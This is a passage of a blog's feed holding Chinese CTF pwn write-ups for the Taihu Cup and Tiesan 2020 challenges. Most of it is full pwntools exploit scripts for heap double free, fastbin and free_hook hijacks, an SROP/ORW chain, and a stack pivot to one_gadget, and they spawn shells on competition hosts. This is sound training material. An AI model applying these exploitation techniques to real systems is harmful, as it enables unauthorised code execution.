class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sa(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sa(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'666'</span>)    sa(<span class="hljs-string">'hack'</span>,str(data))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):    add(i,<span class="hljs-number">0x8</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">9</span>):    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(i))    sla(<span class="hljs-string">':'</span>,str(<span class="hljs-number">0</span>))free(<span class="hljs-number">7</span>)show(<span class="hljs-number">3</span>)ru(<span class="hljs-string">': '</span>)heap_base = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x2c0</span>info_addr(<span class="hljs-string">'heap'</span>,heap_base)add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))add(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(heap_base+<span class="hljs-number">0x250</span>))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>,<span class="hljs-number">30</span>):    add(i,<span class="hljs-number">0x58</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">20</span>,<span class="hljs-number">29</span>):    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(i))    sla(<span class="hljs-string">':'</span>,str(<span class="hljs-number">0</span>))free(<span class="hljs-number">27</span>)sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'5'</span>)sla(<span class="hljs-string">'ice'</span>,<span class="hljs-string">'666'</span>)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x264140</span>info_addr(<span class="hljs-string">'libc'</span>,libc_base)payload = p64(libc_base +<span class="hljs-number">0x1e75a8</span>)sla(<span class="hljs-string">'hack'</span>,payload)payload = p64(libc_base +<span class="hljs-number">0x52fd0</span>)backdoor(payload)backdoor(payload)backdoor(payload)backdoor(payload)add(<span class="hljs-number">38</span>,<span class="hljs-number">0x30</span>,<span class="hljs-string">'/bin/sh\x00'</span>)free(<span class="hljs-number">38</span>)itr()</code></pre></div><h3 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h3><p>其在用realloc free以后，写好size，还是可以正常使用编辑功能的。然后改掉由于<code>e-&gt;key = tcache;</code> 产生的<code>tcache_entry</code>的值，改为0即可。这样就绕过了<code>_int_free</code> 中对于double free的检测。接着再次free 这个堆块即可造成double free。接着完成利用即可。</p><h2 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h2><ul><li>和上题一样，还是realloc搭配free构造出uaf</li><li>开启了沙箱，只能orw</li><li>控制heap上一个chunk的name字段，利用edit name功能，实现free hook的改写</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'122.112.231.25'</span>,<span class="hljs-number">8004</span>)    libc = elf.libccontext.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(name,idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">':'</span>,str(name))    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(size))    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,choice,size,data)</span>:</span>    <span class="hljs-keyword">if</span> size == <span class="hljs-number">0</span> :        sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)        sla(<span class="hljs-string">':'</span>,str(idx))        sla(<span class="hljs-string">':'</span>,str(choice))        sla(<span class="hljs-string">":"</span>,str(size))        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>    <span class="hljs-keyword">if</span> choice ==<span class="hljs-number">1</span>:        sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)        sla(<span class="hljs-string">':'</span>,str(idx))        sla(<span class="hljs-string">':'</span>,str(choice))        sla(<span class="hljs-string">"name:"</span>,str(data))        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))    sla(<span class="hljs-string">':'</span>,str(choice))    sla(<span class="hljs-string">":"</span>,str(size))    sla(<span class="hljs-string">":"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">':'</span>,str(idx))sla(<span class="hljs-string">'1'</span>,<span class="hljs-string">'\x01\x02\x03'</span> + <span class="hljs-string">'\x00'</span>)sla(<span class="hljs-string">'2'</span>,<span class="hljs-string">'\x01\x03\xde'</span> + <span class="hljs-string">'\x00'</span>)payload = <span class="hljs-string">'chumen77'</span> + <span class="hljs-string">'\x71'</span> + <span class="hljs-string">'\x00'</span> * <span class="hljs-number">6</span> add(payload,<span class="hljs-number">0</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">1</span>,<span class="hljs-number">0xe0</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">5</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">'1'</span>)add(payload,<span class="hljs-number">6</span>,<span class="hljs-number">0x8</span>,<span class="hljs-string">'1'</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'fo:'</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4b78</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)edit(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)free_hook = <span class="hljs-number">0x3c67a8</span> + libcbasepayload = p64(<span class="hljs-number">0</span>) + p64(free_hook - <span class="hljs-number">0x20</span>)show(<span class="hljs-number">2</span>)ru(<span class="hljs-string">'fo:'</span>)heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3b0</span>- <span class="hljs-number">0x20</span>info_addr(<span class="hljs-string">'heapbase'</span>,heapbase)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">7</span>,<span class="hljs-number">0x68</span>,p64(heapbase + <span class="hljs-number">0x540</span>))add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">9</span>,<span class="hljs-number">0x68</span>,p64(libcbase + <span class="hljs-number">0x3c4aed</span>))payload = p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(heapbase + <span class="hljs-number">0x580</span>) + p64(<span class="hljs-number">0x8</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x21</span>) +p64(free_hook) + p64(<span class="hljs-number">6</span>) + p64(heapbase + <span class="hljs-number">0x5e0</span>)add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">10</span>,<span class="hljs-number">0x68</span>,payload)edit(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x47b85</span> + libcbase),p64(<span class="hljs-number">0x47b85</span> + libcbase))frame = SigreturnFrame()frame.rdi = <span class="hljs-number">0</span>frame.rsi = free_hook + <span class="hljs-number">0x20</span>frame.rdx = <span class="hljs-number">0x200</span>frame.rsp = free_hook + <span class="hljs-number">0x20</span>frame.rip = libcbase + libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()payload = str(frame)[<span class="hljs-number">0x40</span>:]add(<span class="hljs-string">'chumen77'</span>,<span class="hljs-number">11</span>,<span class="hljs-number">0x100</span>,payload)orw = shellcraft.open(<span class="hljs-string">'./flag'</span>) + shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next() +libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next() +libcbasepop_rdx = libcbase+libc.search(asm(<span class="hljs-string">"pop rdx \nret"</span>)).next()rop = flat([pop_rdi,free_hook - <span class="hljs-number">0x7a8</span>,pop_rsi,<span class="hljs-number">0x1000</span>,pop_rdx,<span class="hljs-number">7</span>,libc.sym[<span class="hljs-string">'mprotect'</span>]+ libcbase,free_hook + <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span> * <span class="hljs-number">8</span>])free(<span class="hljs-number">11</span>)sleep(<span class="hljs-number">0.1</span>)pyaload = rop + asm(orw)s(pyaload)itr()</code></pre></div><h3 id="小记-1"><a href="#小记-1" class="headerlink" title="小记"></a>小记</h3><p>此题中，不能用realloc来操作一个unsortbin，由于其特性，不过size是多大，都会破坏掉<code>main_arena</code>上unsortbin相关的字段，造成接下来无法进行利用。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;太湖杯ctf2020部分wp&quot;&gt;&lt;a href=&quot;#太湖杯ctf2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;太湖杯ctf2020部分wp&quot;&gt;&lt;/a&gt;太湖杯ctf2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;seven-hero&quot;&gt;&lt;a hr
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>铁人三项2020第二赛区 pwn</title>
    <link href="http://chumen77.xyz/2020/11/04/%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B92020%E7%AC%AC%E4%BA%8C%E8%B5%9B%E5%8C%BA%20pwn/"/>
    <id>http://chumen77.xyz/2020/11/04/铁人三项2020第二赛区 pwn/</id>
    <published>2020-11-04T11:26:29.296Z</published>
    <updated>2020-11-13T06:08:54.909Z</updated>
    
    <content type="html"><![CDATA[<h1 id="铁人三项2020第二赛区-pwn"><a href="#铁人三项2020第二赛区-pwn" class="headerlink" title="铁人三项2020第二赛区 pwn"></a>铁人三项2020第二赛区 pwn</h1><h2 id="stackstorm"><a href="#stackstorm" class="headerlink" title="stackstorm"></a>stackstorm</h2><p>程序存在栈溢出可以溢出0x10的字节，考虑栈迁移。一共可以触发2次，第一次用来泄漏出栈地址，第二次用泄漏的栈地址，栈迁移，在可控的输入区，进行rop，泄漏出libc地址。然后，让其返回start开始处，清理栈进行第3次的漏洞利用，这个时候时间覆盖返回地址为one gadget即可。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./stackstorm'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.15.32'</span>,<span class="hljs-number">9999</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()payload1= <span class="hljs-string">'1'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload1)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># r()</span>payload2 = <span class="hljs-string">'1'</span> * (<span class="hljs-number">0x70</span><span class="hljs-number">-1</span>) + <span class="hljs-string">'!'</span>sa(<span class="hljs-string">'data2'</span>,payload2)ru(<span class="hljs-string">'!'</span>)stack = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'stack'</span>,stack)pop_rdi = <span class="hljs-number">0x0000000000400903</span>pop_rsi_r15 = <span class="hljs-number">0x0000000000400901</span>l_ret = <span class="hljs-number">0x00000000004007c1</span>payload1= <span class="hljs-string">'2'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload1)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)payload3 = p64(<span class="hljs-number">0</span>) + flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],p64(<span class="hljs-number">0x0000000000400650</span>)])payload3 = payload3.ljust((<span class="hljs-number">0x70</span>),<span class="hljs-string">'\x00'</span>)payload3 += p64(stack<span class="hljs-number">-0x90</span>) + p64(l_ret)sa(<span class="hljs-string">'data2'</span>,payload3)sleep(<span class="hljs-number">0.1</span>)r()r(<span class="hljs-number">1</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x20740</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)rec = <span class="hljs-number">0x4526a</span> + libcbasepayload4= <span class="hljs-string">'3'</span> *<span class="hljs-number">0x300</span>sla(<span class="hljs-string">'data1'</span>,payload4)<span class="hljs-comment"># debug()</span>sleep(<span class="hljs-number">0.1</span>)<span class="hljs-comment"># r()</span>payload5 = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x70</span>) + p64(rec) *<span class="hljs-number">2</span>sa(<span class="hljs-string">'data2'</span>,payload5)itr()</code></pre></div><h2 id="note"><a href="#note" class="headerlink" title="note"></a>note</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li><li>add堆时，写入title 字段存在溢出，可以覆盖到堆地址</li></ul><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">read_diy</span><span class="hljs-params">(__int64 a1, <span class="hljs-keyword">int</span> a2)</span></span>&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+13h] [rbp-Dh]</span>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span>  <span class="hljs-keyword">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= a2; ++i )                   <span class="hljs-comment">// 存在溢出</span>  &#123;    <span class="hljs-keyword">if</span> ( read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">1u</span>LL) &lt; <span class="hljs-number">0</span> )      <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);    *(_BYTE *)(a1 + i) = buf;    <span class="hljs-keyword">if</span> ( *(_BYTE *)(i + a1) == <span class="hljs-number">10</span> )    &#123;      *(_BYTE *)(i + a1) = <span class="hljs-number">0</span>;      <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;    &#125;  &#125;  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>攻击思路：<br>先泄漏出来libc地址，释放A B C 3个0x68大小的堆块，接着申请一个0x68大小堆的时候触发一下title的溢出，其会是修改一下其申请到的堆地址的最后一个字节，使其指向刚刚释放过的chunk A，然后再释放这个堆，就构成了double free，劫持fastbin 打 malloc hook 为one gadget 。拿到shell。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./note'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'172.20.15.32'</span>,<span class="hljs-number">10002</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(size,title,data)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'size'</span>,str(size))    sla(<span class="hljs-string">'le:'</span>,str(title))    sa(<span class="hljs-string">'tent'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'ote'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'ote'</span>,str(idx))add(<span class="hljs-number">0xf0</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)free(<span class="hljs-number">0</span>)add(<span class="hljs-number">0x10</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x18</span>,<span class="hljs-string">'chumen77'</span>,<span class="hljs-string">'11111111'</span>)<span class="hljs-comment"># debug()</span>show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">"note content: "</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x3c4c31</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)free(<span class="hljs-number">3</span>)<span class="hljs-comment"># debug()</span>sla(<span class="hljs-string">'ice:'</span>,<span class="hljs-string">'1'</span>)sla(<span class="hljs-string">'size'</span>,str(<span class="hljs-number">0x68</span>))payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">16</span> + <span class="hljs-string">'\x10'</span>sla(<span class="hljs-string">'le:'</span>,str(payload))free(<span class="hljs-number">1</span>)payload = <span class="hljs-number">0x3c4aed</span> + libcbaseadd(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,p64(payload))payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">11</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xf1147</span> + libcbase)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'chumen77'</span>,payload)<span class="hljs-comment"># debug()</span>itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;铁人三项2020第二赛区-pwn&quot;&gt;&lt;a href=&quot;#铁人三项2020第二赛区-pwn&quot; class=&quot;headerlink&quot; title=&quot;铁人三项2020第二赛区 pwn&quot;&gt;&lt;/a&gt;铁人三项2020第二赛区 pwn&lt;/h1&gt;&lt;h2 id=&quot;stackstor
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>湖湘杯ctf2020部分wp</title>
